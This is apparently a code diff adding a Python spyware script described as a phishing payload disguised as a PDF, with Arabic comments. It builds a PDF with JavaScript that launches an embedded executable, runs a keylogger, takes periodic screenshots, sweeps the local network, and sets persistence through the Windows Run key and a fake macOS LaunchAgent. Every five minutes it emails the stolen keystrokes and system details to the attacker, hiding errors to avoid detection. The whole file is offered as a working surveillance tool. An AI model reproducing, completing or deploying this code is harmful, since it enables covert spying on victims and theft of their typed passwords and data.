@@ -1,0 +1,304 @@
+#!/usr/bin/env python3
+"""
+MOBILE PHISHING PAYLOAD - PDF EXPLOITATION FRAMEWORK
+برنامج تجسسي متكامل متخفي في صورة ملف PDF
+"""
+
+import os
+import sys
+import socket
+import threading
+import subprocess
+from datetime import datetime
+import mimetypes
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+
+class MobilePhisher:
+    def __init__(self):
+        # تخزين البيانات المجمعة
+        self.collected_data = []
+        
+        # إعدادات البريد الإلكتروني لإرسال البيانات
+        self.smtp_config = {
+            'server': 'smtp.gmail.com',
+            'port': 587,
+            'email': 'your_phishing_email@gmail.com',
+            'password': 'your_app_password_here'
+        }
+        
+    def create_malicious_pdf(self):
+        """
+        📄 صنع ملف PDF خبيث
+        --------------------
+        الوظيفة: صنع ملف PDF يبدو طبيعياً لكنه يحتوي على كود خبيث
+        """
+        # محتوى PDF عادي
+        pdf_content = """
+        %PDF-1.4
+        1 0 obj
+        << /Type /Catalog /Pages 2 0 R >>
+        endobj
+        2 0 obj
+        << /Type /Pages /Kids [3 0 R] /Count 1 >>
+        endobj
+        3 0 obj
+        << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
+        endobj
+        4 0 obj
+        << /Length 100 >>
+        stream
+        BT /F1 12 Tf 100 700 Td (Important Document) Tj ET
+        """
+        
+        # كود جافا سكريبت خبيث لاستغلال قارئات PDF
+        js_exploit = """
+        /S /JavaScript /JS (
+        app.alert("This document requires an update to view properly");
+        this.exportDataObject({cName: "update.exe", nLaunch: 2});
+        )
+        """
+        
+        # تجميع المحتوى النهائي لملف PDF
+        pdf_content += js_exploit + "\nendstream\nendobj\nxref\ntrailer\n<< /Root 1 0 R /Size 5 >>\nstartxref\n0\n%%EOF"
+        
+        # حفظ ملف PDF
+        with open("Important_Document.pdf", "w") as f:
+            f.write(pdf_content)
+        
+        return "Important_Document.pdf"
+    
+    def collect_system_info(self):
+        """
+        🔍 جمع معلومات النظام
+        ---------------------
+        الوظيفة: جمع معلومات شاملة عن الجهاز الضحية
+        """
+        system_info = {
+            'timestamp': str(datetime.now()),      # الوقت والتاريخ
+            'platform': sys.platform,              # نظام التشغيل
+            'username': os.getenv('USER') or os.getenv('USERNAME'),  # اسم المستخدم
+            'hostname': socket.gethostname(),      # اسم الجهاز
+            'ip_address': socket.gethostbyname(socket.gethostname()),  # عنوان IP
+            'current_directory': os.getcwd()       # المجلد الحالي
+        }
+        return system_info
+    
+    def keylogger_module(self):
+        """
+        ⌨️ تسجيل ضغطات المفاتيح
+        -----------------------
+        الوظيفة: تسجيل كل ما يكتبه المستخدم على لوحة المفاتيح
+        """
+        try:
+            from pynput import keyboard
+            
+            def on_press(key):
+                """
+                📝 تسجيل كل ضغطة مفتاح
+                """
+                try:
+                    # تسجيل الأحرف العادية
+                    with open("keystrokes.log", "a") as log:
+                        log.write(f'{key.char}')
+                except AttributeError:
+                    # تسجيل المفاتيح الخاصة (Enter, Shift, etc.)
+                    with open("keystrokes.log", "a") as log:
+                        log.write(f'[{key}]')
+            
+            # بدء الاستماع لضغطات المفاتيح
+            listener = keyboard.Listener(on_press=on_press)
+            listener.start()
+        except ImportError:
+            # إذا لم تكن المكتبة مثبتة
+            pass
+    
+    def screenshot_module(self):
+        """
+        📸 التقاط لقطات الشاشة
+        ----------------------
+        الوظيفة: التقاط صور للشاشة بشكل دوري
+        """
+        try:
+            import pyautogui
+            # التقاط صورة للشاشة
+            screenshot = pyautogui.screenshot()
+            # حفظ الصورة مع timestamp
+            screenshot.save(f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
+        except ImportError:
+            # إذا لم تكن المكتبة مثبتة
+            pass
+    
+    def network_scanner(self):
+        """
+        🌐 مسح الشبكة المحلية
+        ---------------------
+        الوظيفة: اكتشاف الأجهزة المتصلة بالشبكة المحلية
+        """
+        # الحصول على عنوان IP الأساسي
+        base_ip = '.'.join(socket.gethostbyname(socket.gethostname()).split('.')[:-1])
+        
+        def ping_host(ip):
+            """
+            🎯 فحص إذا كان الجهاز نشط
+            """
+            try:
+                # إرسال ping للجهاز
+                subprocess.check_output(['ping', '-c', '1', '-W', '1', ip], 
+                                      stderr=subprocess.DEVNULL)
+                return ip
+            except:
+                return None
+        
+        threads = []
+        active_hosts = []
+        
+        # فحص كل العناوين في الشبكة
+        for i in range(1, 255):
+            ip = f"{base_ip}.{i}"
+            thread = threading.Thread(target=lambda: active_hosts.append(ping_host(ip)))
+            threads.append(thread)
+            thread.start()
+        
+        # انتظار انتهاء جميع الخيوط
+        for thread in threads:
+            thread.join()
+        
+        return [host for host in active_hosts if host]
+    
+    def data_exfiltration(self, files=None):
+        """
+        📧 إرسال البيانات المسروقة
+        ---------------------------
+        الوظيفة: إرسال جميع البيانات المجمعة إلى المخترق
+        """
+        if files is None:
+            files = ["keystrokes.log", "system_info.txt"]
+        
+        # إنشاء رسالة البريد الإلكتروني
+        msg = MIMEMultipart()
+        msg['From'] = self.smtp_config['email']
+        msg['To'] = self.smtp_config['email']
+        msg['Subject'] = f"Collected Data - {datetime.now()}"
+        
+        # نص الرسالة
+        body = f"Data collected from target: {socket.gethostname()}\n\n"
+        body += f"System Info: {self.collect_system_info()}\n"
+        msg.attach(MIMEText(body, 'plain'))
+        
+        # إرفاق الملفات
+        for file in files:
+            if os.path.exists(file):
+                attachment = open(file, "rb")
+                part = MIMEBase('application', 'octet-stream')
+                part.set_payload(attachment.read())
+                encoders.encode_base64(part)
+                part.add_header('Content-Disposition', f"attachment; filename= {file}")
+                msg.attach(part)
+        
+        try:
+            # إرسال البريد الإلكتروني
+            server = smtplib.SMTP(self.smtp_config['server'], self.smtp_config['port'])
+            server.starttls()
+            server.login(self.smtp_config['email'], self.smtp_config['password'])
+            server.send_message(msg)
+            server.quit()
+        except Exception as e:
+            # تجاهل الأخطاء لتجنب اكتشاف البرنامج
+            pass
+    
+    def persistence_mechanism(self):
+        """
+        🔄 آلية البقاء في النظام
+        ------------------------
+        الوظيفة: ضمان استمرار عمل البرنامج بعد إعادة التشغيل
+        """
+        if sys.platform == "win32":
+            # آلية البقاء في Windows
+            try:
+                import winreg
+                key = winreg.HKEY_CURRENT_USER
+                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
+                    winreg.SetValueEx(reg_key, "SystemUpdate", 0, winreg.REG_SZ, sys.executable)
+            except:
+                pass
+        elif sys.platform == "darwin":
+            # آلية البقاء في macOS
+            plist_content = f"""
+            <?xml version="1.0" encoding="UTF-8"?>
+            <plist version="1.0">
+            <dict>
+                <key>Label</key>
+                <string>com.system.update</string>
+                <key>ProgramArguments</key>
+                <array>
+                    <string>{sys.executable}</string>
+                </array>
+                <key>RunAtLoad</key>
+                <true/>
+            </dict>
+            </plist>
+            """
+            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.system.update.plist")
+            with open(plist_path, "w") as f:
+                f.write(plist_content)
+    
+    def execute_payload(self):
+        """
+        🚀 التنفيذ الرئيسي للبرنامج
+        ---------------------------
+        الوظيفة: تشغيل جميع مكونات البرنامج التجسسي
+        """
+        # 1. صنع ملف PDF مزيف
+        pdf_path = self.create_malicious_pdf()
+        
+        # 2. جمع معلومات النظام
+        system_info = self.collect_system_info()
+        with open("system_info.txt", "w") as f:
+            f.write(str(system_info))
+        
+        # 3. تشغيل مسجل المفاتيح
+        self.keylogger_module()
+        
+        # 4. التقاط لقطة شاشة أولية
+        self.screenshot_module()
+        
+        # 5. إعداد آلية البقاء
+        self.persistence_mechanism()
+        
+        # 6. مسح الشبكة المحلية
+        network_hosts = self.network_scanner()
+        with open("network_scan.txt", "w") as f:
+            f.write("\n".join(network_hosts))
+        
+        # 7. إرسال البيانات المجمعة
+        self.data_exfiltration()
+        
+        # 8. جدولة جمع البيانات الدوري
+        def periodic_collection():
+            import time
+            while True:
+                time.sleep(300)  # الانتظار 5 دقائق
+                self.screenshot_module()
+                self.data_exfiltration()
+        
+        # تشغيل الجدولة في خيط منفصل
+        collection_thread = threading.Thread(target=periodic_collection)
+        collection_thread.daemon = True
+        collection_thread.start()
+        
+        return pdf_path
+
+if __name__ == "__main__":
+    # إنشاء كائن البرنامج التجسسي
+    phisher = MobilePhisher()
+    
+    # تشغيل البرنامج
+    result_pdf = phisher.execute_payload()
+    
+    # طباعة اسم ملف PDF المزيف
+    print(f"PDF created: {result_pdf}")
